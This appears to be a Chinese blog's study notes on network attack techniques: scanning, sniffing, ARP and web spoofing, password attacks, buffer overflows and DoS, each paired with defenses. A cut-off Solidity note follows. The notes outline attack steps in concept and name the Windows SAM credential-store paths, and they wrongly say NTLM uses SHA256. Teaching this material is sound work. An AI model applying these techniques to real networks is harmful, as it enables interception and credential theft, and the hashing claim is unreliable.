title="IP扫描"></a>IP扫描</h6></li></ul><p>​IP扫描又叫Ping扫描，主要是通过使用系统自带工具Ping完成的</p><p>（基于ICMP协议，其主要思想就是构造一个ICMP包，发送给目的主机，从目的主机生成的响应来进行判断目标主机是否存活）</p><p><strong>Nmap</strong></p><p>Nmap是一个网络连接端口扫描软件，用来扫描目标网络主机的网络连接端口。确定哪些服务正在哪些端口上运行，从此推断运行在目标主机上的操作系统类型。它能很容易并相对较快的对目标地址空间进行ICMP Ping扫描。</p><p>Nmap的官方网址为<a href="https://nmap.org/">https://nmap.org/</a></p><ul><li><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6></li></ul><p>​<strong>端口扫描可以分为TCP扫描和UDP扫描</strong></p><p>​<strong>1. TCP端口扫描即三次握手</strong></p><p><img src="https://s2.loli.net/2024/11/10/nDifTvw7uHqh4rF.png" alt="7.png"></p><p>​1.第一次握手：客户端向服务器发送报文段1，其中的 SYN 标志位 (前文已经介绍过各种标志位的作用)的值为 1，表示这是一个用于请求发起连接的报文段，其中的序号字段 (Sequence Number，图中简写为seq)被设置为初始序号x (Initial Sequence Number，ISN)，TCP 连接双方均可随机选择初始序号。发送完报文段1之后，客户端进入 SYN-SENT 状态，等待服务器的确认。</p><p>2.第二次握手：服务器在收到客户端的连接请求后，向客户端发送报文段2作为应答，其中 ACK 标志位设置为 1，表示对客户端做出应答，其确认序号字段 (Acknowledgment Number，图中简写为小写 ack) 生效，该字段值为 x + 1，也就是从客户端收到的报文段的序号加一，代表服务器期望下次收到客户端的数据的序号。此外，报文段2的 SYN 标志位也设置为1，代表这同时也是一个用于发起连接的报文段，序号 seq 设置为服务器初始序号y。发送完报文段2后，服务器进入 SYN-RECEIVED 状态。</p><p>3.第三次握手：客户端在收到报文段2后，向服务器发送报文段3，其 ACK 标志位为1，代表对服务器做出应答，确认序号字段 ack 为 y + 1，序号字段 seq 为 x + 1。此报文段发送完毕后，双方都进入 ESTABLISHED 状态，表示连接已建立。</p><p>•<strong>第一步</strong>：客户端进程发出断开连接指令，这将导致客户端的TCP程序创建一个特殊的TCP报文段，发送到服务器。这个报文段的FIN字段被置为1，表示这是一条断开连接的报文；</p><p>•<strong>第二步</strong>：服务器接收到客户端发来的断开连接报文，向客户端回送这个报文的确认报文（ACK字段为1），告诉服务器已经接收到FIN报文，并允许断开连接；</p><p>•<strong>第三步</strong>：服务器发送完确认报文后，服务器的TCP程序创建一条自己的断开连接报文，此报文的FIN字段被置为1，然后发往客户端；</p><p>•<strong>第四步</strong>：客户端接收到服务器发来的FIN报文段，则产生一条确认报文（ACK为1），发送给服务器，告知服务器已经接收到了它的断开报文。服务器接收到这条ACK报文段后，释放TCP连接相关的资源（缓存和变量），而<strong>客户端等待一段时间后</strong>（半分钟、一分钟或两分钟），也释放处于客户端的缓存和变量；</p><p>•<strong>ACK</strong>：只有1 bit的标志位，若为1，表示这个数据段中的确认序号是有效的，即这个数据报是对之前接收到的某个报文的确认（一个TCP报文可以同时作为确认报文和传递数据报文）。</p><p>•<strong>RST</strong>：只有1 bit的标志位，若客户端向服务器的一个端口请求建立TCP连接，但是服务器的那个端口并不允许建立连接（比如没开启此端口），则服务器会回送一个TCP报文，将RST位置为1，告诉客户端不要再向这个端口发起连接；</p><p>•<strong>SYN</strong>：只有1 bit的标志位，若为1，表示这是一条建立连接的TCP报文段；</p><p>•<strong>FIN</strong>：只有1 bit的标志位，若为1，表示这是一条断开连接的TCP报文段；</p><p><strong>UDP扫描</strong></p><ul><li><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p></li><li><p>使用特定的 UDP服务客户端（如 Snmpwalk，dig或Tftp）发送UDP数据包到目标UDP网络服务之后等待确定性的响应信息。</p></li><li><h6 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h6></li></ul><p>​漏洞扫描程序的基本原理：具有漏洞的应用程序在对某些网络请求作答时，与已经安装补丁的程序有所差别；利用这些差别可以识别目标主机上的程序是否存在漏洞。</p><p>​常用的漏洞扫描工具有Nessus、OpenVAS、X-Scan等</p><h4 id="6-2-2-嗅探技术"><a href="#6-2-2-嗅探技术" class="headerlink" title="6.2.2 嗅探技术"></a>6.2.2 嗅探技术</h4><p>对攻击者来说，通过嗅探技术能以非常隐蔽的方式攫取网络中的大量敏感信息，<strong>与主动扫描相比，嗅探行为更难被察觉，也更容易操作</strong></p><h5 id="嗅探器的作用"><a href="#嗅探器的作用" class="headerlink" title="嗅探器的作用"></a>嗅探器的作用</h5><p><strong>不正当用途</strong>：</p><p> (1) 窃取机密信息，包括各种用户名和口令，电子邮件正文及附件、网络打印的文档等；</p><p> (2) 窥探底层的协议信息，如DNS的IP地址、本机IP地址、网关IP地址等；</p><p> (3) 通过嗅探器获得的数据还可以为攻击者进行中间人攻击篡改数据提供帮助。</p><p><strong>正当用途</strong>：</p><p> (1) 解释网络上传输的数据包的含义；</p><p> (2) 为网络诊断提供参考；</p><p> (3) 为网络性能分析提供参考；</p><p> (4) 发现网络入侵现象，为入侵检测提供参考；</p><p> (5) 将网络事件记入日志。</p><p><strong>常见嗅探工具</strong></p><p>•tcpdump嗅探器软件</p><p> 可以将网络中传送的数据包的包头完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助去掉无用的信息。同时也是维护的比较好的开源嗅探器软件，官方网址是<a href="http://www.tcpdump.org/%E3%80%82">http://www.tcpdump.org/。</a></p><p>•wireshark网络数据包分析工具</p><p>主要作用是捕获网络数据包，并尽可能详细地显示数据包的内容，它使用WinPCAP作为接口，直接与网卡进行数据报文交换， wireshark的官方网址是<a href="https://www.wireshark.org/%E3%80%82">https://www.wireshark.org/。</a></p><p><strong>集线器网络</strong></p><p><img src="https://s2.loli.net/2024/11/10/b12ujcUeyCz3WAi.png" alt="8.png"></p><p>假设机器A上的管理员为了维护机器C，使用了一个FTP命令向机器C进行远程登陆，</p><p>机器B上的管理员想知道究竟登陆机器C上FTP口令，仅仅需要把自己机器上的网卡置于混杂模式，并对接收到的数据帧进行分析。</p><p><strong>交换机网络</strong></p><p>几种在交换网络中实现的嗅探方法：</p><p>•MAC洪泛</p><p> 向交换机发送大量含有虚构的MAC地址和IP地址的包，使交换机无法处理如此多的信息，致使交换机进入了所谓的“打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有机器广播数据包</p><p>•MAC欺骗</p><p> 攻击者通过将源MAC地址伪造为目标主机的源MAC地址，并将这样的数据包通过交换机发送出去，使得交换机不断的更新MAC—端口映射表，从而让交换机相信攻击者主机的MAC就是目标主机的MAC，交换机就会把本应发送给目标主机的数据包发送给攻击者</p><p>•ARP欺骗</p><p> 攻击者通过对网关和目标主机进行ARP欺骗，就可以截获两者之间的通信数据，实现嗅探的目的</p><h4 id="6-2-3-其他信息收集技术"><a href="#6-2-3-其他信息收集技术" class="headerlink" title="6.2.3 其他信息收集技术"></a>6.2.3 其他信息收集技术</h4><p><strong>利用公开服务收集信息</strong></p><pre><code> WEB与搜索引擎服务、USENET（新闻组服务）、WhoIs服务</code></pre><p><strong>网络拓扑探测</strong></p><p>​主要方法是路由跟踪，执行路由跟踪的工具是在类UNIX操作系统平台上的traceroute和Windows平台的Tracert客户端程序</p><p><strong>系统类型探测</strong></p><ul><li>利用端口扫描。</li><li>利用Banner</li><li>TCP&#x2F;IP协议栈指纹</li></ul><p>​TCP&#x2F;IP 堆栈指纹识别是对 TCP&#x2F;IP 堆栈实现的特征的远程检测。然后，参数的组合可用于推断远程机器的操作系统（也称为操作系统指纹），或合并到设备指纹中</p><h4 id="6-2-4-关于漏洞与信息收集的防范"><a href="#6-2-4-关于漏洞与信息收集的防范" class="headerlink" title="6.2.4 关于漏洞与信息收集的防范"></a>6.2.4 关于漏洞与信息收集的防范</h4><p><strong>防范网络扫描：</strong></p><p>•在防火墙及过滤设备上采用严格的过滤规则，禁止扫描的数据包进入系统。</p><p>•主机系统除了必要的网络服务外，禁止其它的网络应用程序。 </p><p>•对于只对内开放的网络服务，更改其提供服务的端口。 </p><p>•抓取扫描时的数据包，对扫描者进行反向追踪。</p><p><strong>防范嗅探</strong>：</p><p>•及时打补丁。 </p><p>•开启本机监控。</p><p>•监控本地局域网的数据帧。</p><p>•对敏感数据加密。</p><p>•使用安全的拓扑结构。</p><p>•安装ARP防火墙。</p><h3 id="6-3-网络欺骗"><a href="#6-3-网络欺骗" class="headerlink" title="6.3 网络欺骗"></a>6.3 网络欺骗</h3><h4 id="6-3-1-IP欺骗"><a href="#6-3-1-IP欺骗" class="headerlink" title="6.3.1 IP欺骗"></a>6.3.1 IP欺骗</h4><p><strong>以其它主机IP作为源IP向目标主机发送数据包</strong></p><p><strong>IP欺骗的危害：</strong></p><p>以可信任的身份与服务器建立连接和伪造源IP地址，隐藏攻击者身份，消除攻击痕迹</p><p><strong>IP 欺骗的两种表现形式：</strong></p><p>•攻击者伪造的IP地址不可达或者根本不存在。</p><p>•攻击者通过在自己发出的IP 包中填入被目标主机所信任的主机的IP来进行冒充。</p><p><strong>IP欺骗的步骤</strong></p><p>•找到一个被目标主机信任的主机；</p><p>•使被信任的主机丧失工作能力；</p><p>•伪装成被信任的主机, 向目标主机发送SYN；</p><p>•猜测或嗅探得到SYN+ACK的值；</p><p>•再向目标主机发送ACK连接建立</p><h4 id="6-3-2-电子邮件欺骗"><a href="#6-3-2-电子邮件欺骗" class="headerlink" title="6.3.2 电子邮件欺骗"></a>6.3.2 电子邮件欺骗</h4><p>•电子邮件欺骗（email spoofing）是伪造电子邮件头，导致信息看起来来源于某个人或某个地方，而实际却不是真实的源地址。</p><p>•这种欺骗发生的主要原因是由于发送电子邮件最主要的协议—简单邮件传输协议（SMTP）不包括认证机制。即使SMTP服务扩展允许SMTP客户端通过邮件服务器来商议安全级别。但这一预防措施并不是总被使用。如果预防措施没有被使用，具备必要知识的任何人都可以连接到服务器，并使用其发送邮件</p><h4 id="6-3-3-Web欺骗"><a href="#6-3-3-Web欺骗" class="headerlink" title="6.3.3 Web欺骗"></a>6.3.3 Web欺骗</h4><p>•攻击者创造了一个表面上看起来完全相同的网站，它拥有相同的网页和链接。然而，攻击者控制着假冒的Web站点，这样被攻击者浏览器和Web服务器之间的所有网络信息完全被攻击者所截获</p><p>•基本原理：在受攻击者和提供真正服务的Web服务器之间设立攻击者的Web服务器，这种攻击种类在安全问题中称为“来自中间的攻击”</p><p><strong>工作流程如下所示</strong>：</p><ul><li><p>用户点击经过改写后的 <a href="http://www.www.org/http://home.xxx1.com">http://www.www.org/http://home.xxx1.com</a> ；</p></li><li><p><a href="http://www.www.org向http//home.xxx1.com">http://www.www.org向http://home.xxx1.com</a> 请求文档；</p></li><li><p><a href="http://home.xxx1.com向http//www.www.org">http://home.xxx1.com向http://www.www.org</a> 返回文档；</p></li><li><p><a href="http://www.www.org/">http://www.www.org</a> 改写文档中的所有URL；</p></li><li><p><a href="http://www.www.org/">http://www.www.org</a> 向用户返回改写后的文档。</p></li><li><p>•修改过的文档中的所有URL都指向了<a href="http://www.org/">www.org</a> ，当用户点击任何一个链接都会直接进入 <a href="http://www.org/">www.org</a> ，而不会直接进入真正的URL</p></li><li><p>•开始攻击之前，攻击者必须以某种方式引诱受攻击者进入攻击者所创造的错误的Web。黑客往往使用下面三种方法：</p></li><li><p>•把错误的Web链接放到一个热门Web站点上； </p></li><li><p>•如果受攻击者使用基于电子邮件，那么可以将它指向错误的Web； </p></li><li><p>•创建错误的Web索引，指示给搜索引擎</p></li><li><p>•构建自己的DNS服务器，IP地址解析到攻击WEB页面，且将攻击WEB页面伪造成被假冒的页面。</p></li></ul><h4 id="6-3-4-ARP欺骗"><a href="#6-3-4-ARP欺骗" class="headerlink" title="6.3.4 ARP欺骗"></a>6.3.4 ARP欺骗</h4><p>（前文嗅探处有提）</p><p><strong>•ARP原理：</strong></p><p> 主机A要向主机B发送报文，会查询本地的ARP缓存表，找到B的IP地址对应的MAC地址后，就会通过交换机进行数据传输。如果未找到，则广播A一个ARP请求报文（携带主机A的IP地址Ia——物理地址Pa），请求IP地址为Ib的主机B回答物理地址Pb。局域网内所有主机包括B都收到ARP请求，但只有主机B识别自己的IP地址，于是向A主机发回一个ARP响应报文。其中就包含有B的MAC地址，A接收到B的应答后，就会更新本地的ARP缓存。接着使用这个MAC地址发送数据。因此，本地高速缓存的这个ARP cache表是本地网络通讯的基础，这个缓存表是动态更新的。</p><p><strong>典型的ARP欺骗分为两种：</strong></p><ul><li>对路由器ARP cache表的欺骗</li><li>对内网PC的网关欺骗。</li></ul><p>第一种ARP欺骗的原理是截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器的ARP cache中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。</p><p>第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的网关连接到Internet。从被骗PC角度看，就是上不了网了，“网络掉线了”</p><p><strong>ARP欺骗能够得以实现的主要原因有</strong>：</p><p>•ARP协议设计之初没有考虑安全问题，所以任何计算机都可以发送虚假的ARP数据包；</p><p>•ARP协议的无状态性，响应数据包和请求数据包之间没有什么关系，如果主机收到一个ARP响应却无法知道是否真的发送过对应的ARP请求；</p><p>•ARP缓存需要定时更新，给攻击者以可乘之机。</p><p>•<strong>ARP欺骗的主要环境必须是局域网，也就是说攻击者必须先取得进入局域网的合法身份才能进行ARP欺骗</strong></p><p><strong>网络执法官原理</strong>：</p><p> 在网络执法官中，要想限制某台机器上网，只要点击”网卡”菜单中的”权限”，选择指定的网卡号或在用户列表中点击该网卡所在行，从右键菜单中选择”权限”。在弹出的对话框中即可限制该用户的权限。对于未登记网卡，可以这样限定其上线：只要设定好所有已知用户（登记）后，将网卡的默认权限改为禁止上线即可阻止所有未知的网卡上线。使用这两个功能就可限制用户上网。其原理是通过ARP欺骗发给被攻击的电脑一个假的网关IP地址对应的MAC，使其找不到网关真正的MAC地址，这样就可以禁止其上网。</p><p><img src="https://s2.loli.net/2024/11/10/9L6AxnsCBMRYpqi.png" alt="9.png"></p><p><img src="https://s2.loli.net/2024/11/10/TgrSXIcZU7eVohi.png" alt="10.png"></p><h4 id="6-3-5-非技术类欺骗"><a href="#6-3-5-非技术类欺骗" class="headerlink" title="6.3.5 非技术类欺骗"></a>6.3.5 非技术类欺骗</h4><ul><li>社会工程学</li><li>垃圾搜索</li></ul><p>​•攻击者通过搜索被攻击者的废弃物，得到与攻击系统有关的信息</p><h4 id="6-3-6-关于网络欺骗的防范"><a href="#6-3-6-关于网络欺骗的防范" class="headerlink" title="6.3.6 关于网络欺骗的防范"></a>6.3.6 关于网络欺骗的防范</h4><h5 id="IP欺骗的防范"><a href="#IP欺骗的防范" class="headerlink" title="IP欺骗的防范"></a><strong>IP欺骗的防范</strong></h5><p>•抛弃基于地址的信任策略；</p><p>•进行包过滤，只信任内部主机；</p><p>•利用路由器屏蔽掉所有外部希望向内部发出的连接请求；</p><p>•使用加密传输和验证的方法；</p><p>•使用随机化的初始序列号，使得TCP序列号难以猜测。</p><h5 id="Web欺骗的防范"><a href="#Web欺骗的防范" class="headerlink" title="Web欺骗的防范"></a><strong>Web欺骗的防范</strong></h5><p><strong>短期的解决方案</strong>:</p><p>•禁止浏览器中的javascript功能，那么各类改写信息将原形毕露； </p><p>•确保浏览器的连接状态是可见的，它将给你提供当前位置的各类信息； </p><p>•时刻注意你所点击的URL链接会在位置状态行中得到正确的显示。 </p><p><strong>长期的解决方案</strong>:  </p><p>•改变浏览器，使之具有反映真实URL信息的功能，而不会被蒙蔽； </p><p>•对于通过安全连接建立的Web——浏览器对话，浏览器还应该告诉用户谁在另一端，而不只是表明一种安全连接的状态。</p><p><strong>ARP欺骗的防范</strong></p><p>•网关建立静态IP&#x2F;MAC对应关系,各主机建立MAC数据库</p><p>•建立DHCP服务器</p><p>•IDS（Intrusion Detection System，入侵检测系统）监听网络安全。</p><h3 id="6-4-口令攻击"><a href="#6-4-口令攻击" class="headerlink" title="6.4 口令攻击"></a>6.4 口令攻击</h3><h4 id="6-4-1-常见系统口令机制"><a href="#6-4-1-常见系统口令机制" class="headerlink" title="6.4.1 常见系统口令机制"></a>6.4.1 常见系统口令机制</h4><h5 id="口令的存储："><a href="#口令的存储：" class="headerlink" title="口令的存储："></a><strong>口令的存储</strong>：</h5><p>操作系统一般不存储明文口令，只保存口令散列。</p><p>可以在以下几个地方找到windows系统的口令散列：</p><p> 注册表，HKEY_LOCAL_MACHINE\SAM\SAM；</p><p> SAM文件，位置在%SystemRoot%system32\config\SAM；</p><p> 恢复盘，位置在%SystemRoot%repair</p><h5 id="口令的管理"><a href="#口令的管理" class="headerlink" title="口令的管理"></a>口令的管理</h5><p> Windows 系统使用安全账号管理器的机制来管理用户账号。<strong>安全账号管理器对账号的管理是通过安全标识进行的，安全标识在账号创建时就同时创建，一旦账号被删除，安全标识也同时被删除。</strong>安全标识是唯一的，即使是相同的用户名，在每次创建时获得的安全标识也完全不同。因此，一旦某个账号被删除，他的安全标识也就不存在了。即使重建相同的用户名账号，也会有不同的安全标识，不会保留原来的权限。</p><p><strong>Windows使用两种算法来处理明文口令，即LM算法和NTLM算法。</strong></p><p>•1) LM算法，口令转换为hash值，方法如下：</p><p> (1) 口令变成大写；</p><p> (2) 把口令变成14个字符，或截断或补齐；</p><p> (3) 这14个字符分成两个7字符；</p><p> (4) 用7个字符和DES算法加密一个64位“Magic ”；</p><p> (5) 把两个64位结果拼起来，得到128位值；</p><p> (6) 服务器保存该128位值</p><p>•2) NTLM算法，口令转换为hash值，方法如下：</p><p> (1) 把口令变成Unicode编码；</p><p> (2) 使用SHA256散列算法；</p><p> (3) 保存得到的128位散列值</p><h4 id="6-4-2-口令攻击技术"><a href="#6-4-2-口令攻击技术" class="headerlink" title="6.4.2 口令攻击技术"></a>6.4.2 口令攻击技术</h4><p><strong>根据攻击口令是否以网络连接的交互方式进行，可以将攻击分为在线口令攻击和离线口令攻击：</strong></p><ol><li>在线口令攻击：在线攻击是指在线状态下攻击者对用户口令进行的猜测试探攻击；</li><li>离线攻击：离线攻击是指攻击者通过某些手段进行任意多数量的口令猜测，采用攻击字典和攻击程序，最终获得口令。离线攻击方法是Internet上常用的攻击手段。</li></ol><p><strong>根据攻击手段是否参与实际的身份认证过程，可以将攻击分为主动口令攻击和被动口令攻击：</strong></p><ol><li>主动口令攻击又可以分为以下三种形式：</li></ol><ul><li>•字典攻击：字典攻击是一种把常见的、使用概率较高的口令集中存放在字典文件中，利用字典库中的数据不断的进行用户名和口令的反复测试。缺点是只能发现字典里存在的单词口令。</li><li>•强力攻击：尝试所有的字符组合方式，逐一去模拟口令验证过程，缺点是速度慢。</li><li>•组合攻击：综合了以上两种方法，这种攻击介于字典攻击和强力攻击之间。</li></ul><ol start="2"><li>被动口令攻击又可以分为以下三种形式：</li></ol><ul><li>•网络数据流窃听：由于认证信息要通过网络传递，且很多认证系统的口令是未经加密的明文，攻击者通过窃听网络数据，就很容易分辨出某种特定系统的认证数据，并提取出用户名和口令。</li><li>•重放(Record&#x2F;Replay)：有的系统会将认证信息进行简单加密后进行传输，如果攻击者无法用第一种方式推算出口令，可以使用截取&#x2F;重放方式。攻击者仍可以采用离线方式对口令密文实施字典攻击；</li><li>•钓鱼攻击</li></ul><p><strong>口令技术的缺点</strong>：</p><p>•大多数系统的口令是明文传送到验证服务器的，容易被截获。某些系统在建立一个加密链路后再进行口令的传输以解决此问题，如配置链路加密机。 </p><p>•口令维护的成本较高。为保证安全性，口令应当经常更换。另外为避免对口令的字典攻击，口令应当保证一定的长度，并且尽量采用随机的字符。但缺点是难于记忆。</p><p>•口令容易在输入的时候被攻击者偷窥，而且用户无法及时发现。</p><h4 id="6-4-3-关于口令攻击的防范"><a href="#6-4-3-关于口令攻击的防范" class="headerlink" title="6.4.3 关于口令攻击的防范"></a>6.4.3 关于口令攻击的防范</h4><ol><li><strong>选择安全密码</strong></li></ol><ul><li>设置足够长度的口令</li><li>口令中混合使用大小写字母、数字、特殊符号</li></ul><ol start="2"><li><strong>防止口令猜测攻击</strong></li></ol><ul><li>硬盘分区采用NTFS格式</li><li>正确设置和管理帐户</li><li>禁止不需要的服务</li><li>关闭不用的端口</li><li>禁止建立空连接</li></ul><ol start="3"><li><strong>设置安全策略</strong></li></ol><ul><li>强制密码历史。确定唯一新密码的个数，在重新使用旧密码之前，用户必须使用这些密码。</li><li>密码最长使用期限。确定在要求用户更改密码之前用户可以使用该密码的天数。其值介于 0 和 999 之间；如果该值设置为 0，则密码从不过期。</li><li>密码最短使用期限。确定用户可以更改新密码之前这些新密码必须保留的天数。此设置被设计为与“强制密码历史”设置一起使用，这样用户就不能很快地重置有次数要求的密码并更改回旧密码。</li><li>密码长度最小值。确定密码最少可以有多少个字符。</li></ul><ol start="4"><li><strong>采用加密的通信协议</strong>。</li></ol><p> 比如在使用web邮箱时，可以采用更加安全的https。</p><ol start="5"><li><strong>使用U盾输入口令，降低键盘记录攻击的威胁。</strong></li></ol><p>  另外，访问网站时，注意区分是否是虚假站点。</p><h3 id="6-5-缓冲区溢出攻击"><a href="#6-5-缓冲区溢出攻击" class="headerlink" title="6.5 缓冲区溢出攻击"></a>6.5 缓冲区溢出攻击</h3><h4 id="6-5-1-缓冲区溢出的概念"><a href="#6-5-1-缓冲区溢出的概念" class="headerlink" title="6.5.1 缓冲区溢出的概念"></a>6.5.1 缓冲区溢出的概念</h4><p><strong>缓冲区</strong>：</p><p> 从程序的角度，缓冲区就是应用程序用来保存用户输入数据和代码的临时数据的内存空间。</p><p><strong>缓冲区溢出</strong>：</p><p> 如果用户输入的数据长度超出了程序为其分配的内存空间，这些数据就会覆盖程序为其它数据分配的内存空间，形成所谓的缓冲区溢出。</p><p><strong>缓冲区溢出的危害</strong>：</p><p> 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统和应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统当机和重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。</p><h4 id="6-5-2-缓冲区溢出的基本原理"><a href="#6-5-2-缓冲区溢出的基本原理" class="headerlink" title="6.5.2 缓冲区溢出的基本原理"></a>6.5.2 缓冲区溢出的基本原理</h4><p>缓冲溢出通常在程序缓冲区编写超出其长度的代码——造成溢出，从而破坏其堆栈，使程序执行攻击者在程序地址空间中早已安排好的代码以达到其目的。</p><p>由于name只有8字节大小，在进行strcpy前，并没有检测argv[1]的长度，如果argv[1]的长度大于8，则复制时就会覆盖name数组后面的ebp的内容及main函数的返回地址。等函数返回时，程序就会跳转到修改后的地址去执行。</p><p><strong>几种实现缓冲区攻击的方法</strong></p><p> 在程序的地址空间里安排适当的代码</p><ul><li>•植入法。</li><li>•利用已经存在的代码。</li></ul><p> 通过适当的初始化寄存器和内存，让程序跳转到攻击者安排的地址空间执行</p><ul><li>•通过Activation Records（活动记录）改变地址</li><li>•通过Function Pointers（函数指针）改变地址</li><li>•通过Longjmpbuffers（长跳转缓冲区）改变地址</li></ul><h4 id="6-5-3-缓冲区溢出的类型"><a href="#6-5-3-缓冲区溢出的类型" class="headerlink" title="6.5.3 缓冲区溢出的类型"></a>6.5.3 缓冲区溢出的类型</h4><p><strong>按照溢出缓冲区所在的区域类型来划分，可分为栈溢出和堆溢出</strong></p><p>•栈溢出特点：缓冲区在栈中分配；拷贝的数据过长；覆盖了函数的返回地址、其它一些重要数据结构或函数指针</p><p>•堆溢出特点：缓冲区在堆中分配；拷贝的数据过长；覆盖了堆管理结构</p><p>•其他溢出类型中，最典型的就是整型溢出</p><p>•整型数溢出从造成溢出原因的角度来说可以分为三大类：存储溢出、计算溢出和符号问题</p><h4 id="6-5-4-缓冲区溢出的防范"><a href="#6-5-4-缓冲区溢出的防范" class="headerlink" title="6.5.4 缓冲区溢出的防范"></a>6.5.4 缓冲区溢出的防范</h4><p><strong>对缓冲区溢出的防范方法主要有以下几种方式</strong>：</p><p> 编写严格的代码</p><p> 不可执行堆栈数据段</p><p> 利用程序编译器的边界检查</p><p> 指针完整性检查</p><h3 id="6-6-拒绝服务攻击"><a href="#6-6-拒绝服务攻击" class="headerlink" title="6.6 拒绝服务攻击"></a>6.6 拒绝服务攻击</h3><h4 id="6-6-1-拒绝服务攻击的概念"><a href="#6-6-1-拒绝服务攻击的概念" class="headerlink" title="6.6.1 拒绝服务攻击的概念"></a>6.6.1 拒绝服务攻击的概念</h4><p><strong>服务：</strong></p><p> 是指系统提供的，用户需求的一些功能。</p><p><strong>拒绝服务</strong>（DoS）：</p><p> DoS是Denial of Service的简称，即拒绝服务，任何对服务的干涉，使得其可用性降低或者失去可用性均称为拒绝服务。例如一个计算机系统崩溃或其带宽耗尽或其硬盘被填满，导致其不能提供正常的服务，就构成拒绝服务。</p><p><strong>拒绝服务攻击</strong>：</p><p> 造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。</p><p><strong>分布式拒绝服务（DDoS）攻击：</strong></p><p> 如果处于不同位置的多个攻击者同时向一个或数个目标发起攻击，或者一个或多个攻击者控制了位于不同位置的多台机器并利用这些机器对受害者同时实施攻击</p><h4 id="6-6-2-利用系统漏洞进行拒绝服务攻击"><a href="#6-6-2-利用系统漏洞进行拒绝服务攻击" class="headerlink" title="6.6.2 利用系统漏洞进行拒绝服务攻击"></a>6.6.2 利用系统漏洞进行拒绝服务攻击</h4><p>•系统漏洞是包含在操作系统或应用程序中与安全相关的系统缺陷。这些缺陷大多是由于错误的编程、粗心的源代码审核或一些不当的绑定所造成的，常被攻击者利用</p><p> 例如微软的Windows 操作系统中的安全漏洞允许rootkits在使用操作系统的计算机上隐藏起来或者实施拒绝服务器攻击</p><p> Windows GDI Plus library存在处理畸形图象漏洞，可能引起远程拒绝服务</p><p>•解决这类攻击方法只能是不停的修复漏洞，同时加强管理人员对这类问题的重视程度</p><h4 id="6-6-3-利用协议漏洞进行拒绝服务攻击"><a href="#6-6-3-利用协议漏洞进行拒绝服务攻击" class="headerlink" title="6.6.3 利用协议漏洞进行拒绝服务攻击"></a>6.6.3 利用协议漏洞进行拒绝服务攻击</h4><p>•几个典型的利用协议漏洞进行的拒绝服务攻击：</p><p> <strong>SYN Flood</strong></p><p> UDP flood拒绝服务攻击</p><p> <strong>Land攻击</strong></p><p>   这是利用漏洞，进行发送大量的源地址与目的地址相同的包，从而造成服务器解析Land包时占用大量的处理资源，当收到的包达到一定程度时，就会形成拒绝服务攻击。</p><p> <strong>死Ping</strong></p><p>   Ping是通过发送ICMP报文来判断主机是否存活。利用这个命令就能发动一次攻击，当发送超大型这种包时，也就是发送的包超过65535字节会造成服务器重组包时发生缓冲区溢出，从而让服务器崩溃发生拒绝服务。</p><h4 id="6-6-4-对拒绝服务攻击的防范"><a href="#6-6-4-对拒绝服务攻击的防范" class="headerlink" title="6.6.4 对拒绝服务攻击的防范"></a>6.6.4 对拒绝服务攻击的防范</h4><ul><li>•确保所有服务器采用最新系统，并打上安全补丁</li><li>•删除多余的网络服务</li><li>•自己定制防火墙规则</li><li>•确保从服务器相应的目录或文件数据库中删除未使用的服务</li><li>•禁止内部网通过Modem连接至PSTN系统</li><li>•禁止使用网络访问程序如Telnet、Ftp、Rsh、Rlogin和Rcp，以基于PKI的访问程序如SSH取代</li></ul><p>​（ps: rsh是”remote shell”(远程 shell)的缩写，该命令在指定的远程主机上启动一个shell并执行用户在rsh命令行中指定的命令;如果用户没有给出要执行的命令，rsh就用rlogin命令使用户登录到远程机上。</p><p>​remote file copy，即远程文件拷贝)</p><ul><li>•限制在防火墙外与网络文件共享</li><li>•在防火墙上运行端口映射程序或端口扫描程序</li><li>•检查所有网络设备和主机&#x2F;服务器系统的日志</li><li>•确保管理员对所有主机进行检查，而不仅针对关键主机</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【学习笔记】solidity基础001</title>
      <link href="/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/"/>
      <url>/2024/11/07/solidity%E5%9F%BA%E7%A1%80%EF%BC%881%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>关键词：变量 数值类型 函数 数组 印射<br>仅个人学习使用（WTF学习笔记）</p><h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><h4 id="初始值"><a href="#初始值" class="headerlink" title="初始值"></a>初始值</h4><p><strong>bytes1</strong> <strong>是固定大小的字节类型，表示一个 1 字节的值（8 位）。它的初始值（默认值）是 0x00，即所有位都为 0。</strong></p><p><strong>具体解释：</strong></p><ul><li><strong>在 Solidity 中，任何未赋值的变量都会有一个默认值。对于 bytes1 类型，它的默认值是一个长度为 1 字节的值，所有的位都被初始化为 0，用十六进制表示为 0x00。</strong></li><li><strong>如果用二进制表示，它是 00000000。</strong></li></ul><p><strong>值类型初始值</strong></p><ul><li><p><strong>boolean: false</strong></p></li><li><p><strong>string: “”</strong></p></li><li><p><strong>int: 0</strong></p></li><li><p><strong>uint: 0</strong></p></li><li><p><strong>enum:</strong> 